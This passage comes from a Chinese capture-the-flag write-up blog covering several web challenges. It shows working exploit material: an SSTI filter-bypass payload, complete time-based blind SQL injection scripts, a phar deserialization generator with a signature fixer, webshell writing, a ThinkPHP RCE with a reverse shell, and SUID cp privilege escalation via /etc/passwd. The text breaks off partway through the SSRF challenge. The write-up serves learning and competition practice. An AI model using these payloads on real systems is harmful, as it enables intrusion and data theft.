class="built_in">eval</span>|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">                name):</span></span><br><span class="line"><span class="string">            abort(500)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            return render_template_string(</span></span><br><span class="line"><span class="string">                &#x27;</span>竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁<span class="string">&#x27; % name)</span></span><br><span class="line"><span class="string">    except Exception:</span></span><br><span class="line"><span class="string">        abort(500)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.errorhandler(404)</span></span><br><span class="line"><span class="string">def page_not_find(e):</span></span><br><span class="line"><span class="string">    return render_template(&#x27;</span><span class="number">404.</span>html<span class="string">&#x27;), 404</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.errorhandler(500)</span></span><br><span class="line"><span class="string">def internal_server_error(e):</span></span><br><span class="line"><span class="string">    return render_template(&#x27;</span><span class="number">500.</span>html<span class="string">&#x27;), 500</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    app.run(&#x27;</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">&#x27;, port=8080)</span></span><br></pre></td></tr></table></figure>

<p>发现<code>/backdoor</code> 可以进行ssti 但是先获取key</p>
<p>查看源码 可以发现secret是由config引进来的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from config import secret_key</span><br></pre></td></tr></table></figure>

<p>读取key<code>/download?file=/app/config.py</code>获得<code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p>
<p>最难绷的就是这个session里面进行ssti payload一多就会爆500错真的让人难绷</p>
<p>能不能对session的获取加个base64编解码。。。 真的会方便很多 </p>
<p>还有session伪造的时候转义。。。。编个码吧</p>
<p>payload：<code>&#123;% print(config['_''_cl''ass_''_']['_''_in''it_''_']['_''_glo''bals_''_']['o''s']['pop''en']('head /y0*')['read']()) %&#125;&quot;&#125;&#39;</code></p>
<h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><p>考点:</p>
<ul>
<li>sql时间盲注</li>
</ul>
<p>这个题目找到自己缺漏的地方了 没咋好好做过时间盲注</p>
<p>导致自己写的脚本注起来太慢了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://fef1d48c-1c22-46b2-aba3-0d22fafc8c10.node4.buuoj.cn:81&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=<span class="attr">high</span>:</span><br><span class="line">        paylaod = <span class="string">&quot;1/**/And/**/if(ascii(substr((select/**/group_Concat(name)/**/from/**/ctf.items),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(5),0)%23&quot;</span>.<span class="title function_">format</span>(i,mid)</span><br><span class="line">        #爆库：<span class="number">1</span><span class="comment">/**/</span><span class="title class_">And</span><span class="comment">/**/</span><span class="keyword">if</span>(<span class="title function_">ascii</span>(<span class="title function_">substr</span>(<span class="title function_">database</span>(),&#123;&#125;,<span class="number">1</span>))<span class="comment">/**/</span>&gt;<span class="comment">/**/</span>&#123;&#125;,<span class="title function_">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)%<span class="number">23</span></span><br><span class="line">        #报表：<span class="number">1</span><span class="comment">/**/</span><span class="title class_">And</span><span class="comment">/**/</span><span class="keyword">if</span>(<span class="title function_">ascii</span>(<span class="title function_">substr</span>((select<span class="comment">/**/</span><span class="title function_">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="property">tables</span><span class="comment">/**/</span>where<span class="comment">/**/</span>table_schema<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="string">&#x27;ctf&#x27;</span>),&#123;&#125;,<span class="number">1</span>))<span class="comment">/**/</span>&gt;<span class="comment">/**/</span>&#123;&#125;,<span class="title function_">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)%<span class="number">23</span></span><br><span class="line">        #爆列：<span class="number">1</span><span class="comment">/**/</span><span class="title class_">And</span><span class="comment">/**/</span><span class="keyword">if</span>(<span class="title function_">ascii</span>(<span class="title class_">Substr</span>((<span class="title class_">Select</span>(<span class="title function_">group_Concat</span>(column_name))<span class="title function_">from</span>(<span class="title class_">Information</span>_schema.<span class="property">columns</span>)<span class="title class_">Where</span>(table_name<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="string">&#x27;items&#x27;</span>)),&#123;&#125;,<span class="number">1</span>))<span class="comment">/**/</span>&gt;<span class="comment">/**/</span>&#123;&#125;,<span class="title function_">sleep</span>(<span class="number">4</span>),<span class="number">0</span>)%<span class="number">23</span></span><br><span class="line">        #爆数据：</span><br><span class="line">        timestart = time.<span class="title function_">time</span>()</span><br><span class="line">        r = requests.<span class="title function_">get</span>(url+<span class="string">&quot;?id=&quot;</span>+paylaod)</span><br><span class="line">        timeend = time.<span class="title function_">time</span>()</span><br><span class="line">        <span class="keyword">if</span> (timeend - timestart &gt;= <span class="number">3</span>):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            high = mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    result+=<span class="title function_">chr</span>(high+<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>通过时间差值来判断有时候会不准 </p>
<p>最好通过捕获异常的方式进行判断会更准</p>
<p>更好的方式:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">trange</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">127</span>, <span class="number">31</span>, -<span class="number">1</span>):</span><br><span class="line">        url = r<span class="string">&#x27;http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span> # information_schema,mysql,performance_schema,sys,test,ctf</span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span> # id,name,price</span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        # <span class="title function_">print</span>(url)</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            response = requests.<span class="title function_">get</span>(url=url, timeout=<span class="number">3</span>)</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            last = res</span><br><span class="line">            # <span class="title function_">print</span>(<span class="title function_">chr</span>(j+<span class="number">1</span>))</span><br><span class="line">            res += <span class="title function_">chr</span>(j+<span class="number">1</span>)</span><br><span class="line">            # <span class="title function_">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;[*] &#x27;</span> + res)</span><br></pre></td></tr></table></figure>

<h2 id="OtenkiBoy（未解出）"><a href="#OtenkiBoy（未解出）" class="headerlink" title="OtenkiBoy（未解出）"></a>OtenkiBoy（未解出）</h2><p>不太会 不想代码审计了qwq</p>
<h1 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h1><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><p>考点：</p>
<ul>
<li>phar反序列化</li>
<li>phar重签名</li>
</ul>
<p>源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">story</span>&#123;</span><br><span class="line">    private $user=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    public $pass;</span><br><span class="line">    public $eating;</span><br><span class="line">    public $God=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $this-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            echo $fffflag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__construct</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $this-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        $this-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="title function_">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__tostring</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;user.<span class="property">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__invoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$this-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            echo $nothing;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;<span class="title class_">God</span>==<span class="string">&#x27;true&#x27;</span>&amp;&amp;$this-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">system</span>($this-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="title function_">isset</span>($_GET[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    $pear=$_GET[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    $Adam=$_GET[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    $file=<span class="title function_">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_">file_put_contents</span>($pear,<span class="title function_">urldecode</span>($file));</span><br><span class="line">    <span class="title function_">file_exists</span>($Adam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>非预期了</p>
<p>由于没有控制路径</p>
<p>直接写马到网站根目录就行了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/pairing.<span class="property">php</span>?pear=<span class="regexp">/var/</span>www/html/a.<span class="property">php</span>&amp;apple=<span class="number">1</span></span><br><span class="line">x=<span class="title function_">system</span>(<span class="string">&#x27;cat /flllag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988088416-7cd82ab6-f545-4824-8ccf-6e9813e9255a.png" alt="img"></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988099715-8340a7be-7dd9-4926-9ba8-a0a6b2ab7fb6.png" alt="img"></p>
<p>之后看看预期解学习</p>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>看了官方文档预期解来了</p>
<p>考察的phar重签名的知识点</p>
<p>首先恶意类利用很简单 只需要<code>__wakeup和__destruct</code>即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">story</span>&#123;</span><br><span class="line">    public $eating = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">    public $God=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>);</span><br><span class="line">$phar-&gt;<span class="title function_">startBuffering</span>();</span><br><span class="line">$phar-&gt;<span class="title function_">setStub</span>(<span class="string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> <span class="title function_">story</span>();</span><br><span class="line">$phar-&gt;<span class="title function_">setMetadata</span>($o);</span><br><span class="line">$phar-&gt;<span class="title function_">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;<span class="title function_">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p><code>__wakeup</code>通过修改类属性个数绕过即可 这里就涉及到一个phar重签名的问题</p>
<p>因为我们的恶意payload是在phar文件中 生成phar之后修改类属性个数</p>
<p>按照官方WP</p>
<blockquote>
<p>phar的最后有一段signature，是phar的签名，放在文件末尾，要注意因为我们修改了文件的内容，之前的签名就会无效，所以需要更换一个新的签名</p>
</blockquote>
<p>修改签名脚本如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;Z1d10t.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> <span class="attr">file</span>:</span><br><span class="line">    f = file.<span class="title function_">read</span>()</span><br><span class="line">s = f[:-<span class="number">28</span>] # 获取要签名的数据</span><br><span class="line">h = f[-<span class="number">8</span>:] # 获取签名类型和<span class="variable constant_">GBMB</span>标识</span><br><span class="line">newf = s + <span class="title function_">sha1</span>(s).<span class="title function_">digest</span>() + h # 数据 + 签名 + (类型 + <span class="variable constant_">GBMB</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;ChangedPhar.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> <span class="attr">file</span>:</span><br><span class="line">    file.<span class="title function_">write</span>(newf) # 写入新文件</span><br></pre></td></tr></table></figure>

<p>然后将修改签名后的文件内容读出来url编码之后通过post传进去 </p>
<p>再通过<code>phar://</code>协议读取即可成功rce </p>
<p>但是我没复现成功  我反弹shell去看上传的文件内容也没错 但是就是不得解 不知道什么原因</p>
<p>用官方WP中的脚本 也不成功</p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>报错发现是thinkphp5.0.23 那么可以直接根据版本去找漏洞利用</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698479533782-f7d4c9e8-4bd6-4a96-b468-7e9225580e39.png" alt="img"></p>
<p>这里当时为了抢一血直接用工具梭哈了</p>
<p>写马到网站根目录下 发现禁了system 那么我们用passthru或者exec等无回显函数都可以 反正我们要进行反弹shell</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481376316-6c17aacc-a517-4047-95f5-cd46b8a6a792.png" alt="img"></p>
<p>记得payload要url编码一下</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481525990-8c6fad3d-f5c8-4968-afa3-4cfa7cf6d689.png" alt="img"></p>
<p>发现权限不够 涉及提权 那一般是考察suid提权 </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481570952-e9ed3e3d-a994-4707-97f2-5fe5a50e12cf.png" alt="img"></p>
<p>看看哪些命令有suid</p>
<p>有cp 呢铁定是cp提权了</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481643850-8aaf3276-06d0-4874-83c3-864ea8233ae4.png" alt="img"></p>
<p>直接把内容复制到&#x2F;etc&#x2F;passwd 然后拿flag</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481704911-05884a79-1873-4441-b306-6615bb8d8e1c.png" alt="img"></p>
<h2 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h2><p>这道题目应该借鉴的是SCTF2023的<code>pypyp？</code></p>
<p>考点：</p>
<ul>
<li>ssrf</li>
<li>flask pin码计算</li>
<li>gopher协议</li>
</ul>
<p>做这道题目之前庆幸学习了0xgame2023一道ssrf打redis主从复制题目</p>
<p>学习Aecous师傅的的WP:) 师傅太强力ORZ</p>
<p>源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($_REQUEST[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $ch = <span class="title function_">curl_init</span>();</span><br><span class="line">        <span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_URL</span>, $_REQUEST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_CONNECTTIMEOUT</span>, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_HTTPHEADER</span>, $_REQUEST[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        $output = <span class="title function_">curl_exec</span>($ch);</span><br><span class="line">        echo $output;</span><br><span class="line">        <span class="title function_">curl_close</span>($ch);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="title class_">Error</span> $x)&#123;</span><br><span class="line">        <span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line">        <span class="title function_">highlight_string</span>($x-&gt;<span class="title function_">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>首先根据题目获取提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hint[]=your%3F&amp;hint[]=mine!&amp;hint[]=hint!!</span><br></pre></td></tr></table></figure>

<p>拿到了&#x2F;目录下的文件情况</p>
<p>可以醒目的发现app.py</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">total <span class="number">12</span></span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">51</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> .</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">51</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> ..</span><br><span class="line">-rwxr-xr-x    <span class="number">1</span> root root   <span class="number">0</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> .<span class="property">dockerenv</span></span><br><span class="line">-rwxr-xr-x    <span class="number">1</span> root root <span class="number">353</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">52</span> app.<span class="property">py</span></span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">7</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span>  <span class="number">8</span>  <span class="number">2021</span> boot</span><br><span class="line">drwxr-xr-x    <span class="number">5</span> root root <span class="number">360</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> dev</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">66</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> etc</span><br><span class="line">-rw-------    <span class="number">1</span> root root  <span class="number">43</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> flag</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span>  <span class="number">8</span>  <span class="number">2021</span> home</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">7</span> <span class="title class_">Nov</span> <span 